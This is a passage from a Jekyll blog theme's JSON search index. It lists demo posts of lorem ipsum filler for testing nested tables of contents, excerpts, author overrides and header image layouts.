pariatur nisi commodo. Deserunt eiusmod eiusmod elit anim exercitation quis. Anim laboris irure minim elit fugiat velit esse officia amet reprehenderit id. Dolor eiusmod incididunt excepteur sint aute qui esse nostrud. Nisi qui adipisicing consectetur enim pariatur sint veniam esse.   2.1.2 Nisi non nisi ullamco ipsum cillum  Minim officia tempor eiusmod sint magna reprehenderit do amet ex velit. Irure nulla ut veniam eu veniam proident esse pariatur cillum. Esse anim et proident cillum esse magna sint.   2.1.3 Ut pariatur do do eiusmod consequat do pariatur nisi ex anim reprehenderit nostrud  Reprehenderit consectetur tempor labore dolore ad. Ullamco qui sunt quis deserunt id ipsum sit qui nisi esse deserunt ad exercitation. Dolore qui in mollit ex qui minim et ipsum reprehenderit. Tempor magna ipsum proident voluptate mollit quis consectetur veniam non aliquip cupidatat nisi culpa aute.   2.1.1.1 Ut aute quis ipsum fugiat dolor  Occaecat excepteur et ea et exercitation ad aute minim incididunt incididunt aute sint officia aliquip. Quis cupidatat nostrud dolor consequat laboris eu ullamco qui esse excepteur aute. Veniam ut ipsum aute Lorem proident minim ea fugiat Lorem cillum. Qui esse id minim consequat ullamco aliqua pariatur ea mollit. Minim ea ipsum laborum consequat esse mollit pariatur. Voluptate sit voluptate non ut consectetur irure laboris ex adipisicing dolore elit aliquip velit. In eu veniam voluptate incididunt aute eu reprehenderit ut id voluptate.   2.1.1.2 Consequat nostrud quis officia et aliquip quis magna mollit veniam  Magna duis exercitation dolor amet. Ea irure laborum sit officia reprehenderit enim aute magna duis. Elit fugiat ut proident sit.   2.1.1.1.1 Id cillum proident labore occaecat reprehenderit excepteur fugiat est   Irure qui veniam incididunt irure consequat mollit consectetur est nostrud deserunt eiusmod nostrud quis. Eiusmod id proident eu aute exercitation irure consectetur sit dolor dolor in esse. Qui eu dolor ea est magna amet laborum qui irure. Reprehenderit excepteur voluptate fugiat exercitation voluptate laboris nostrud qui magna et officia.   2.1.1.1.2 In consectetur ea qui quis culpa nulla   Ad quis duis dolore voluptate laborum eiusmod consequat sint. Cupidatat officia ex laborum ad non mollit excepteur ea. Nostrud elit in consequat sunt adipisicing reprehenderit ipsum proident irure. Sint velit laborum sint laboris ea. Veniam occaecat et in Lorem proident minim deserunt labore laborum reprehenderit. Consequat laborum deserunt culpa consectetur. Incididunt reprehenderit amet esse duis dolore pariatur adipisicing quis elit.   2.1.1.1.3 Culpa magna pariatur magna officia adipisicing ex minim ea do est   Dolore reprehenderit aute ex id. Ipsum laboris sit quis enim labore ut sint cillum exercitation. Commodo aliqua exercitation enim sunt velit do laborum mollit irure dolor.   2.1.1.1.4 Veniam ipsum non reprehenderit pariatur   Laboris amet quis sunt id dolor consectetur Lorem id aliquip laboris fugiat. Non ex magna deserunt veniam eiusmod. Irure culpa culpa dolore pariatur. Elit enim deserunt ut amet adipisicing elit laborum exercitation cupidatat et. Aliqua aliqua laborum exercitation commodo reprehenderit reprehenderit amet laboris ea ea ex amet in. Aute minim voluptate et ipsum culpa consequat.   2.1.1.3 Ut qui labore officia ad laboris eu amet minim tempor qui cupidatat duis aute   In in dolore laboris irure est consequat magna ea non aute cupidatat tempor. Officia sit pariatur consequat laborum aliqua nulla anim nisi aliquip reprehenderit consequat. Ad duis labore minim consequat reprehenderit labore ex minim cillum magna incididunt adipisicing dolor. Non velit mollit minim consectetur minim. Cillum elit et amet est reprehenderit non. Elit adipisicing nostrud ea veniam occaecat commodo deserunt.   2.1.1.4 Magna ipsum nisi velit anim   Eiusmod tempor dolor proident pariatur consequat sit non nostrud. Eiusmod duis elit esse Lorem dolore et minim elit consectetur eu ullamco. Adipisicing sunt excepteur eu mollit in nostrud.   2.1.1.4.1 Mollit nulla est tempor fugiat occaecat nostrud   Exercitation eu labore Lorem culpa id enim ut officia aute proident in est irure. Nostrud adipisicing magna elit tempor ipsum culpa in incididunt consectetur incididunt veniam aute tempor sint. Officia est consectetur sint sint nostrud proident mollit. Dolore duis proident mollit consectetur tempor.   2.1.1.2.1 Culpa aliquip irure et nostrud esse consequat fugiat dolor   Ad ut commodo elit amet officia ipsum labore do amet. Eiusmod sint irure magna proident nisi adipisicing mollit excepteur mollit proident culpa duis. Est reprehenderit consequat eiusmod deserunt duis ipsum esse amet incididunt.   2.1.4 Laboris exercitation nisi tempor dolore   Elit culpa est eiusmod nostrud occaecat. Labore incididunt nostrud consectetur sint. Ut pariatur laborum incididunt culpa proident incididunt veniam veniam laboris adipisicing mollit. Ullamco magna tempor fugiat veniam in ipsum nisi mollit labore amet et sit quis. In consectetur fugiat Lorem culpa veniam minim. Irure aliqua est mollit consectetur id Lorem velit minim sit velit. Eiusmod magna do dolor est id reprehenderit minim fugiat minim incididunt incididunt laboris velit consequat.   2.2 Officia irure duis et est sunt   Consequat anim quis non nulla. Eiusmod pariatur sunt non culpa culpa ipsum nulla anim in. Non ad exercitation ut reprehenderit ut dolor laborum tempor ad qui magna fugiat irure. Sint commodo ea sint sunt. Irure qui pariatur tempor veniam reprehenderit amet est. Amet laboris proident Lorem deserunt proident duis esse do sit eu dolor qui duis eu. Mollit laboris nisi aute nulla consectetur exercitation nulla aliqua anim.   3 Laborum eu magna proident proident tempor   Occaecat aliqua id voluptate mollit aliquip. Elit excepteur magna esse commodo pariatur reprehenderit in in quis. Id dolore proident proident mollit tempor duis magna ullamco nulla velit consequat. In ut est aliquip in commodo ullamco sit sint.   3.1 Amet enim do laboris ipsum aliqua eiusmod non eu   Laborum magna deserunt do anim quis proident adipisicing. Dolore qui ex minim reprehenderit. Consectetur in cillum ad dolore ut id deserunt irure aute sint magna dolore adipisicing.   3.2 Do exercitation ex elit incididunt sit cupidatat   Excepteur aliqua nisi ullamco sunt fugiat laborum elit aliquip officia culpa. Est exercitation enim laborum amet exercitation. Eu quis qui eiusmod incididunt id do aliquip nostrud do esse enim excepteur enim pariatur. Aute adipisicing velit non culpa quis exercitation. Quis cupidatat anim occaecat Lorem ad mollit aute eiusmod quis dolor duis. Proident anim et nostrud ut aliquip irure adipisicing reprehenderit proident dolore magna. Consequat eu fugiat esse proident duis eu proident fugiat laboris ea veniam nisi reprehenderit.   3.3 Officia aliquip fugiat ex pariatur nisi et nostrud adipisicing eu minim laboris eiusmod ea sunt   Consectetur irure elit nulla elit non officia. Culpa Lorem minim dolor laboris enim labore do minim laborum. Fugiat deserunt nisi ut do incididunt incididunt ea anim exercitation sit duis. Irure esse pariatur labore enim labore qui anim culpa laborum velit consequat. Culpa in adipisicing excepteur est ipsum. In reprehenderit eiusmod ad ad non.   3.4 Ipsum velit laborum est nostrud qui enim ullamco velit dolor Lorem magna   Nulla magna dolor minim commodo. Sunt nulla cupidatat consequat eiusmod elit irure eiusmod excepteur. Sit incididunt irure minim magna. Tempor ipsum exercitation minim sunt labore dolor ullamco veniam enim nisi veniam adipisicing occaecat proident.   3.5 Officia fugiat fugiat voluptate ullamco eiusmod duis minim aliqua consequat consectetur qui do sunt fugiat   Non aute culpa irure qui aute adipisicing aute id commodo id. Laborum ullamco laboris velit in quis duis ut consequat do minim. In minim amet ut reprehenderit et voluptate. In quis Lorem occaecat nostrud excepteur nostrud dolore in nulla ad Lorem nisi. Dolor exercitation Lorem qui sint aute ipsum officia eiusmod aliquip Lorem sit. Reprehenderit ex veniam excepteur laboris magna dolore fugiat sit exercitation esse et consequat in sit. Incididunt pariatur ad esse anim aute do id eu.   3.5.1 Mollit laborum ea aliquip mollit quis commodo fugiat tempor deserunt exercitation sint culpa ipsum tempor   Est cillum laborum cupidatat ullamco cupidatat magna laborum enim duis consequat est eu. Magna cillum Lorem proident non ut officia. Esse irure et laboris eu occaecat aute.   3.5.1.1 Nisi anim commodo consequat quis amet   Sunt eu dolor enim enim consectetur et anim irure dolor velit cillum. Esse reprehenderit cillum incididunt adipisicing amet nostrud adipisicing. Minim mollit nostrud ipsum ea ut sit ex elit. Do esse ad et ipsum nisi sint anim culpa excepteur ipsum. Commodo nisi irure qui reprehenderit incididunt.   3.5.1.1.1 Culpa nulla Lorem adipisicing ut sit cupidatat laborum laborum cupidatat proident   Dolore dolor sit sunt anim eu amet consectetur quis ea proident ex aliqua. Sunt laborum consectetur consectetur enim velit eiusmod labore commodo commodo laboris deserunt. Eiusmod enim do amet laborum commodo qui.   3.6 Reprehenderit culpa consectetur veniam minim cillum in nostrud   Lorem dolore sit aliqua tempor do voluptate ut esse. Minim velit ad velit commodo minim laborum. Qui qui reprehenderit non proident ullamco veniam aliquip.   4 Laboris aute consequat id eu et Lorem amet   Ad qui voluptate dolor veniam. Veniam mollit aute eiusmod eu labore incididunt sint proident. Non minim consequat anim sint. Aliquip non nisi nostrud proident. Eiusmod ut duis commodo sunt laboris irure eu. Laboris quis amet ad qui officia.   5 Esse eu consequat consequat aliqua fugiat nulla ad labore consectetur eu pariatur nisi aute   Duis proident ullamco fugiat aliqua sunt anim ea do irure est amet quis nulla cillum. Commodo voluptate dolor culpa sint aliquip voluptate exercitation anim cillum ad eu in amet. Sint fugiat qui commodo quis ex eu commodo officia aliquip irure. Non dolore elit excepteur id laboris irure consequat magna consectetur. Qui proident deserunt culpa tempor sit aute velit proident cillum ea.   6 Aliquip sunt laborum excepteur cupidatat officia ad tempor veniam esse amet ea commodo sunt   Ex minim pariatur est nisi exercitation exercitation reprehenderit id aliqua deserunt est. Laborum ullamco do ipsum minim ipsum aliquip voluptate voluptate aliqua. Magna proident velit veniam et minim commodo officia officia mollit nisi. Excepteur occaecat deserunt irure adipisicing minim adipisicing cupidatat non anim exercitation ex. Amet quis sunt sint veniam non id nisi ipsum mollit voluptate quis tempor tempor.  ","categories": [],
        "tags": ["table of contents"],
        "url": "https://zjgcjy.github.io/origin/2012-01-03-layout-table-of-contents-include-post/",
        "teaser":null},{
        "title": "Layout: Post with Nested Table of Contents",
        "excerpt":"Tests table of contents with multiple levels to verify indentation is readible.   Enim laboris id ea elit elit deserunt   Magna incididunt elit id enim nisi quis excepteur reprehenderit Lorem dolore dolore ad enim. Labore esse elit excepteur et elit dolor. Elit ut consectetur labore velit elit esse voluptate id commodo. Magna cillum officia consequat non occaecat mollit esse nisi quis.   Nostrud veniam excepteur commodo enim pariatur velit est. Dolor consequat elit occaecat enim veniam ullamco qui est anim ex elit. Est minim aute magna laborum reprehenderit magna reprehenderit ullamco voluptate id sit aliqua. Id labore veniam ad duis aliquip commodo qui ex ut ipsum irure. In et sit ea cupidatat consectetur in nisi amet in cupidatat excepteur commodo amet.   2 Sit adipisicing tempor duis velit cupidatat occaecat do amet   Ad non dolore irure in. In do ut nostrud reprehenderit consequat aliqua sunt culpa voluptate amet minim ea. Eu dolore deserunt consectetur eu in minim sit nulla id id est amet consectetur. Tempor dolore ipsum magna amet velit aliquip ea anim non eu Lorem deserunt. Irure excepteur id adipisicing elit dolor ipsum eiusmod non nulla nisi sint qui et. Occaecat pariatur tempor ex nisi pariatur.   Proident culpa nostrud id est qui fugiat duis aute. Cillum commodo pariatur nostrud culpa Lorem exercitation non. Consequat elit deserunt dolore voluptate sunt labore minim ut consequat minim.   Sunt pariatur in ex non nulla proident ex ullamco Lorem do ipsum. Cillum est mollit reprehenderit excepteur labore labore elit dolore adipisicing ad quis quis aliqua sunt. Proident amet est reprehenderit deserunt amet cupidatat incididunt irure est elit.   2.1 Ex et quis exercitation fugiat excepteur eiusmod mollit consequat id pariatur non adipisicing magna tempor   Nostrud sunt nostrud incididunt adipisicing officia esse minim irure duis dolore adipisicing cupidatat. Eu non labore veniam ad sunt pariatur qui. Irure reprehenderit qui elit duis cillum sit officia consectetur sint deserunt do aute velit. Do id occaecat magna occaecat reprehenderit veniam pariatur Lorem. Officia sit cupidatat adipisicing laborum.   2.1.1 Ut nostrud reprehenderit proident culpa enim irure cupidatat sunt ex ea minim nostrud   Laborum laboris et ut proident sit qui pariatur nisi commodo. Deserunt eiusmod eiusmod elit anim exercitation quis. Anim laboris irure minim elit fugiat velit esse officia amet reprehenderit id. Dolor eiusmod incididunt excepteur sint aute qui esse nostrud. Nisi qui adipisicing consectetur enim pariatur sint veniam esse.   2.1.2 Nisi non nisi ullamco ipsum cillum  Minim officia tempor eiusmod sint magna reprehenderit do amet ex velit. Irure nulla ut veniam eu veniam proident esse pariatur cillum. Esse anim et proident cillum esse magna sint.   2.1.3 Ut pariatur do do eiusmod consequat do pariatur nisi ex anim reprehenderit nostrud  Reprehenderit consectetur tempor labore dolore ad. Ullamco qui sunt quis deserunt id ipsum sit qui nisi esse deserunt ad exercitation. Dolore qui in mollit ex qui minim et ipsum reprehenderit. Tempor magna ipsum proident voluptate mollit quis consectetur veniam non aliquip cupidatat nisi culpa aute.   2.1.1.1 Ut aute quis ipsum fugiat dolor  Occaecat excepteur et ea et exercitation ad aute minim incididunt incididunt aute sint officia aliquip. Quis cupidatat nostrud dolor consequat laboris eu ullamco qui esse excepteur aute. Veniam ut ipsum aute Lorem proident minim ea fugiat Lorem cillum. Qui esse id minim consequat ullamco aliqua pariatur ea mollit. Minim ea ipsum laborum consequat esse mollit pariatur. Voluptate sit voluptate non ut consectetur irure laboris ex adipisicing dolore elit aliquip velit. In eu veniam voluptate incididunt aute eu reprehenderit ut id voluptate.   2.1.1.2 Consequat nostrud quis officia et aliquip quis magna mollit veniam  Magna duis exercitation dolor amet. Ea irure laborum sit officia reprehenderit enim aute magna duis. Elit fugiat ut proident sit.   2.1.1.1.1 Id cillum proident labore occaecat reprehenderit excepteur fugiat est   Irure qui veniam incididunt irure consequat mollit consectetur est nostrud deserunt eiusmod nostrud quis. Eiusmod id proident eu aute exercitation irure consectetur sit dolor dolor in esse. Qui eu dolor ea est magna amet laborum qui irure. Reprehenderit excepteur voluptate fugiat exercitation voluptate laboris nostrud qui magna et officia.   2.1.1.1.2 In consectetur ea qui quis culpa nulla   Ad quis duis dolore voluptate laborum eiusmod consequat sint. Cupidatat officia ex laborum ad non mollit excepteur ea. Nostrud elit in consequat sunt adipisicing reprehenderit ipsum proident irure. Sint velit laborum sint laboris ea. Veniam occaecat et in Lorem proident minim deserunt labore laborum reprehenderit. Consequat laborum deserunt culpa consectetur. Incididunt reprehenderit amet esse duis dolore pariatur adipisicing quis elit.   2.1.1.1.3 Culpa magna pariatur magna officia adipisicing ex minim ea do est   Dolore reprehenderit aute ex id. Ipsum laboris sit quis enim labore ut sint cillum exercitation. Commodo aliqua exercitation enim sunt velit do laborum mollit irure dolor.   2.1.1.1.4 Veniam ipsum non reprehenderit pariatur   Laboris amet quis sunt id dolor consectetur Lorem id aliquip laboris fugiat. Non ex magna deserunt veniam eiusmod. Irure culpa culpa dolore pariatur. Elit enim deserunt ut amet adipisicing elit laborum exercitation cupidatat et. Aliqua aliqua laborum exercitation commodo reprehenderit reprehenderit amet laboris ea ea ex amet in. Aute minim voluptate et ipsum culpa consequat.   2.1.1.3 Ut qui labore officia ad laboris eu amet minim tempor qui cupidatat duis aute   In in dolore laboris irure est consequat magna ea non aute cupidatat tempor. Officia sit pariatur consequat laborum aliqua nulla anim nisi aliquip reprehenderit consequat. Ad duis labore minim consequat reprehenderit labore ex minim cillum magna incididunt adipisicing dolor. Non velit mollit minim consectetur minim. Cillum elit et amet est reprehenderit non. Elit adipisicing nostrud ea veniam occaecat commodo deserunt.   2.1.1.4 Magna ipsum nisi velit anim   Eiusmod tempor dolor proident pariatur consequat sit non nostrud. Eiusmod duis elit esse Lorem dolore et minim elit consectetur eu ullamco. Adipisicing sunt excepteur eu mollit in nostrud.   2.1.1.4.1 Mollit nulla est tempor fugiat occaecat nostrud   Exercitation eu labore Lorem culpa id enim ut officia aute proident in est irure. Nostrud adipisicing magna elit tempor ipsum culpa in incididunt consectetur incididunt veniam aute tempor sint. Officia est consectetur sint sint nostrud proident mollit. Dolore duis proident mollit consectetur tempor.   2.1.1.2.1 Culpa aliquip irure et nostrud esse consequat fugiat dolor   Ad ut commodo elit amet officia ipsum labore do amet. Eiusmod sint irure magna proident nisi adipisicing mollit excepteur mollit proident culpa duis. Est reprehenderit consequat eiusmod deserunt duis ipsum esse amet incididunt.   2.1.4 Laboris exercitation nisi tempor dolore   Elit culpa est eiusmod nostrud occaecat. Labore incididunt nostrud consectetur sint. Ut pariatur laborum incididunt culpa proident incididunt veniam veniam laboris adipisicing mollit. Ullamco magna tempor fugiat veniam in ipsum nisi mollit labore amet et sit quis. In consectetur fugiat Lorem culpa veniam minim. Irure aliqua est mollit consectetur id Lorem velit minim sit velit. Eiusmod magna do dolor est id reprehenderit minim fugiat minim incididunt incididunt laboris velit consequat.   2.2 Officia irure duis et est sunt   Consequat anim quis non nulla. Eiusmod pariatur sunt non culpa culpa ipsum nulla anim in. Non ad exercitation ut reprehenderit ut dolor laborum tempor ad qui magna fugiat irure. Sint commodo ea sint sunt. Irure qui pariatur tempor veniam reprehenderit amet est. Amet laboris proident Lorem deserunt proident duis esse do sit eu dolor qui duis eu. Mollit laboris nisi aute nulla consectetur exercitation nulla aliqua anim.   3 Laborum eu magna proident proident tempor   Occaecat aliqua id voluptate mollit aliquip. Elit excepteur magna esse commodo pariatur reprehenderit in in quis. Id dolore proident proident mollit tempor duis magna ullamco nulla velit consequat. In ut est aliquip in commodo ullamco sit sint.   3.1 Amet enim do laboris ipsum aliqua eiusmod non eu   Laborum magna deserunt do anim quis proident adipisicing. Dolore qui ex minim reprehenderit. Consectetur in cillum ad dolore ut id deserunt irure aute sint magna dolore adipisicing.   3.2 Do exercitation ex elit incididunt sit cupidatat   Excepteur aliqua nisi ullamco sunt fugiat laborum elit aliquip officia culpa. Est exercitation enim laborum amet exercitation. Eu quis qui eiusmod incididunt id do aliquip nostrud do esse enim excepteur enim pariatur. Aute adipisicing velit non culpa quis exercitation. Quis cupidatat anim occaecat Lorem ad mollit aute eiusmod quis dolor duis. Proident anim et nostrud ut aliquip irure adipisicing reprehenderit proident dolore magna. Consequat eu fugiat esse proident duis eu proident fugiat laboris ea veniam nisi reprehenderit.   3.3 Officia aliquip fugiat ex pariatur nisi et nostrud adipisicing eu minim laboris eiusmod ea sunt   Consectetur irure elit nulla elit non officia. Culpa Lorem minim dolor laboris enim labore do minim laborum. Fugiat deserunt nisi ut do incididunt incididunt ea anim exercitation sit duis. Irure esse pariatur labore enim labore qui anim culpa laborum velit consequat. Culpa in adipisicing excepteur est ipsum. In reprehenderit eiusmod ad ad non.   3.4 Ipsum velit laborum est nostrud qui enim ullamco velit dolor Lorem magna   Nulla magna dolor minim commodo. Sunt nulla cupidatat consequat eiusmod elit irure eiusmod excepteur. Sit incididunt irure minim magna. Tempor ipsum exercitation minim sunt labore dolor ullamco veniam enim nisi veniam adipisicing occaecat proident.   3.5 Officia fugiat fugiat voluptate ullamco eiusmod duis minim aliqua consequat consectetur qui do sunt fugiat   Non aute culpa irure qui aute adipisicing aute id commodo id. Laborum ullamco laboris velit in quis duis ut consequat do minim. In minim amet ut reprehenderit et voluptate. In quis Lorem occaecat nostrud excepteur nostrud dolore in nulla ad Lorem nisi. Dolor exercitation Lorem qui sint aute ipsum officia eiusmod aliquip Lorem sit. Reprehenderit ex veniam excepteur laboris magna dolore fugiat sit exercitation esse et consequat in sit. Incididunt pariatur ad esse anim aute do id eu.   3.5.1 Mollit laborum ea aliquip mollit quis commodo fugiat tempor deserunt exercitation sint culpa ipsum tempor   Est cillum laborum cupidatat ullamco cupidatat magna laborum enim duis consequat est eu. Magna cillum Lorem proident non ut officia. Esse irure et laboris eu occaecat aute.   3.5.1.1 Nisi anim commodo consequat quis amet   Sunt eu dolor enim enim consectetur et anim irure dolor velit cillum. Esse reprehenderit cillum incididunt adipisicing amet nostrud adipisicing. Minim mollit nostrud ipsum ea ut sit ex elit. Do esse ad et ipsum nisi sint anim culpa excepteur ipsum. Commodo nisi irure qui reprehenderit incididunt.   3.5.1.1.1 Culpa nulla Lorem adipisicing ut sit cupidatat laborum laborum cupidatat proident   Dolore dolor sit sunt anim eu amet consectetur quis ea proident ex aliqua. Sunt laborum consectetur consectetur enim velit eiusmod labore commodo commodo laboris deserunt. Eiusmod enim do amet laborum commodo qui.   3.6 Reprehenderit culpa consectetur veniam minim cillum in nostrud   Lorem dolore sit aliqua tempor do voluptate ut esse. Minim velit ad velit commodo minim laborum. Qui qui reprehenderit non proident ullamco veniam aliquip.   4 Laboris aute consequat id eu et Lorem amet   Ad qui voluptate dolor veniam. Veniam mollit aute eiusmod eu labore incididunt sint proident. Non minim consequat anim sint. Aliquip non nisi nostrud proident. Eiusmod ut duis commodo sunt laboris irure eu. Laboris quis amet ad qui officia.   5 Esse eu consequat consequat aliqua fugiat nulla ad labore consectetur eu pariatur nisi aute   Duis proident ullamco fugiat aliqua sunt anim ea do irure est amet quis nulla cillum. Commodo voluptate dolor culpa sint aliquip voluptate exercitation anim cillum ad eu in amet. Sint fugiat qui commodo quis ex eu commodo officia aliquip irure. Non dolore elit excepteur id laboris irure consequat magna consectetur. Qui proident deserunt culpa tempor sit aute velit proident cillum ea.   6 Aliquip sunt laborum excepteur cupidatat officia ad tempor veniam esse amet ea commodo sunt   Ex minim pariatur est nisi exercitation exercitation reprehenderit id aliqua deserunt est. Laborum ullamco do ipsum minim ipsum aliquip voluptate voluptate aliqua. Magna proident velit veniam et minim commodo officia officia mollit nisi. Excepteur occaecat deserunt irure adipisicing minim adipisicing cupidatat non anim exercitation ex. Amet quis sunt sint veniam non id nisi ipsum mollit voluptate quis tempor tempor.  ","categories": [],
        "tags": ["table of contents"],
        "url": "https://zjgcjy.github.io/origin/2012-01-03-layout-table-of-contents-indent-post/",
        "teaser":null},{
        "title": "Layout: Post with Table of Contents",
        "excerpt":"Enable table of contents on post or page by adding toc: true to its YAML Front Matter. The title and icon can also be changed with:   --- toc: true toc_label: \"Unique Title\" toc_icon: \"heart\"  # corresponding Font Awesome icon name (without fa prefix) ---   HTML Elements   Below is just about everything you’ll need to style in the theme. Check the source code to see the many embedded elements within paragraphs.   Body text   Lorem ipsum dolor sit amet, test link adipiscing elit. This is strong. Nullam dignissim convallis est. Quisque aliquam.      This is emphasized. Donec faucibus. Nunc iaculis suscipit dui. 53 = 125. Water is H2O. Nam sit amet sem. Aliquam libero nisi, imperdiet at, tincidunt nec, gravida vehicula, nisl. The New York Times (That’s a citation). Underline.Maecenas ornare tortor. Donec sed tellus eget sapien fringilla nonummy. Mauris a ante. Suspendisse quam sem, consequat at, commodo vitae, feugiat in, nunc. Morbi imperdiet augue quis tellus.   HTML and CSS are our tools. Mauris a ante. Suspendisse quam sem, consequat at, commodo vitae, feugiat in, nunc. Morbi imperdiet augue quis tellus. Praesent mattis, massa quis luctus fermentum, turpis mi volutpat justo, eu volutpat enim diam eget metus.   Blockquotes      Lorem ipsum dolor sit amet, test link adipiscing elit. Nullam dignissim convallis est. Quisque aliquam.    List Types   Ordered Lists      Item one            sub item one       sub item two       sub item three           Item two   Unordered Lists      Item one   Item two   Item three   Tables                  Header1       Header2       Header3                       cell1       cell2       cell3                 cell4       cell5       cell6                       cell1       cell2       cell3                 cell4       cell5       cell6                       Foot1       Foot2       Foot3           Code Snippets   #container {   float: left;   margin: 0 -240px 0 0;   width: 100%; }   Buttons   Make any link standout more when applying the .btn class.   &lt;a href=\"#\" class=\"btn btn--success\"&gt;Success Button&lt;/a&gt;   Primary Button Success Button Warning Button Danger Button Info Button  Notices   Watch out! You can also add notices by appending {: .notice} to a paragraph.  ","categories": [],
        "tags": ["table of contents"],
        "url": "https://zjgcjy.github.io/origin/2012-01-03-layout-table-of-contents-post/",
        "teaser":null},{
        "title": "Layout: Post with Sticky Table of Contents",
        "excerpt":"“Stick” table of contents to the top of a page by adding toc_sticky: true to its YAML Front Matter.   --- toc: true toc_sticky: true ---   HTML Elements   Below is just about everything you’ll need to style in the theme. Check the source code to see the many embedded elements within paragraphs.   Body text   Lorem ipsum dolor sit amet, test link adipiscing elit. This is strong. Nullam dignissim convallis est. Quisque aliquam.      This is emphasized. Donec faucibus. Nunc iaculis suscipit dui. 53 = 125. Water is H2O. Nam sit amet sem. Aliquam libero nisi, imperdiet at, tincidunt nec, gravida vehicula, nisl. The New York Times (That’s a citation). Underline.Maecenas ornare tortor. Donec sed tellus eget sapien fringilla nonummy. Mauris a ante. Suspendisse quam sem, consequat at, commodo vitae, feugiat in, nunc. Morbi imperdiet augue quis tellus.   HTML and CSS are our tools. Mauris a ante. Suspendisse quam sem, consequat at, commodo vitae, feugiat in, nunc. Morbi imperdiet augue quis tellus. Praesent mattis, massa quis luctus fermentum, turpis mi volutpat justo, eu volutpat enim diam eget metus.   Blockquotes      Lorem ipsum dolor sit amet, test link adipiscing elit. Nullam dignissim convallis est. Quisque aliquam.    List Types   Ordered Lists      Item one            sub item one       sub item two       sub item three           Item two   Unordered Lists      Item one   Item two   Item three   Tables                  Header1       Header2       Header3                       cell1       cell2       cell3                 cell4       cell5       cell6                       cell1       cell2       cell3                 cell4       cell5       cell6                       Foot1       Foot2       Foot3           Code Snippets   #container {   float: left;   margin: 0 -240px 0 0;   width: 100%; }   Buttons   Make any link standout more when applying the .btn class.   &lt;a href=\"#\" class=\"btn btn--success\"&gt;Success Button&lt;/a&gt;   Primary Button Success Button Warning Button Danger Button Info Button  Notices   Watch out! You can also add notices by appending {: .notice} to a paragraph.  ","categories": [],
        "tags": ["table of contents"],
        "url": "https://zjgcjy.github.io/origin/2012-01-03-layout-table-of-contents-sticky/",
        "teaser":null},{
        "title": "Layout: Code Excerpt (Generated)",
        "excerpt":"This is the post content with inline code, (e.g. &lt;span style=\"color: red;\"&gt;red&lt;/span&gt;. It should be displayed in place of the auto-generated excerpt in single-page views. Archive-index pages should display an auto-generated excerpt of this content.   Be sure to test the formatting of the auto-generated excerpt, to ensure that it doesn’t create any layout problems.  ","categories": ["Layout","Uncategorized"],
        "tags": ["content","excerpt","layout"],
        "url": "https://zjgcjy.github.io/origin/2012-03-14-layout-code-excerpt-generated/",
        "teaser":null},{
        "title": "Layout: Excerpt (Defined)",
        "excerpt":"This is the post content. It should be displayed in place of the user-defined excerpt in archive-index pages.   This paragraph should be absent from an archive-index page where post.excerpt is shown.  ","categories": ["Layout","Uncategorized"],
        "tags": ["content","excerpt","layout"],
        "url": "https://zjgcjy.github.io/origin/2012-03-14-layout-excerpt-defined/",
        "teaser":null},{
        "title": "Layout: Excerpt (Generated)",
        "excerpt":"This is the post content. Archive-index pages should display an auto-generated excerpt of this content.     Be sure to test the formatting of the auto-generated excerpt, to ensure that it doesn’t create any layout problems.  ","categories": ["Layout","Uncategorized"],
        "tags": ["content","excerpt","layout"],
        "url": "https://zjgcjy.github.io/origin/2012-03-14-layout-excerpt-generated/",
        "teaser":null},{
        "title": "Layout: Author Override",
        "excerpt":"Sites that may have content authored from various individuals can be accommodated by using data files.   To attribute an author to a post or page that is different from the site author specified in _config.yml:   Step 1. Create _data/authors.yml and add authors using the following format. Anything variables found under author in _config.yml can be used (e.g. name, bio, avatar, author links, etc.).   # /_data/authors.yml  Billy Rick:   name        : \"Billy Rick\"   bio         : \"What do you want, jewels? I am a very extravagant man.\"   avatar      : \"/assets/images/bio-photo-2.jpg\"   links:     - label: \"Email\"       icon: \"fas fa-fw fa-envelope-square\"       url: \"mailto:billyrick@rick.com\"     - label: \"Website\"       icon: \"fas fa-fw fa-link\"       url: \"https://thewhip.com\"     - label: \"Twitter\"       icon: \"fab fa-fw fa-twitter-square\"       url: \"https://twitter.com/extravagantman\"  Cornelius Fiddlebone:   name        : \"Cornelius Fiddlebone\"   bio         : \"I ordered what?\"   avatar      : \"/assets/images/bio-photo.jpg\"   links:     - label: \"Email\"       icon: \"fas fa-fw fa-envelope-square\"       url: \"mailto:cornelius@thewhip.com\"     - label: \"Twitter\"       icon: \"fab fa-fw fa-twitter-square\"       url: \"https://twitter.com/rhymeswithsackit\"   Step 2. Assign one of the authors in authors.yml to a post or page you wish to override the site.author with.   Example: To assign Billy Rick as an author for a post the following YAML Front Matter would be applied:   author: Billy Rick  ","categories": [],
        "tags": [],
        "url": "https://zjgcjy.github.io/origin/2012-03-15-layout-author-override/",
        "teaser":null},{
        "title": "Layout: Author Sidebar Disabled",
        "excerpt":"This post has the author sidebar disabled.   To disable add author_profile: false to YAML Front Matter.  ","categories": [],
        "tags": [],
        "url": "https://zjgcjy.github.io/origin/2012-03-15-layout-author-sidebar-disabled/",
        "teaser":null},{
        "title": "Layout: Header Image (External URL)",
        "excerpt":"This post should display a header image, if the theme supports it.   Featured image is an external asset and should load.  ","categories": ["Layout","Uncategorized"],
        "tags": ["edge case","featured image","image","layout"],
        "url": "https://zjgcjy.github.io/origin/2012-03-15-layout-header-image-external/",
        "teaser":null},{
        "title": "Layout: Header Image (Horizontal)",
        "excerpt":"This post should display a header image, if the theme supports it.   Non-square images can provide some unique styling issues.   This post tests a horizontal header image.  ","categories": ["Layout","Uncategorized"],
        "tags": ["edge case","featured image","image","layout"],
        "url": "https://zjgcjy.github.io/origin/2012-03-15-layout-header-image-horizontal/",
        "teaser":null},{
        "title": "Layout: Header Image and Text Readability",
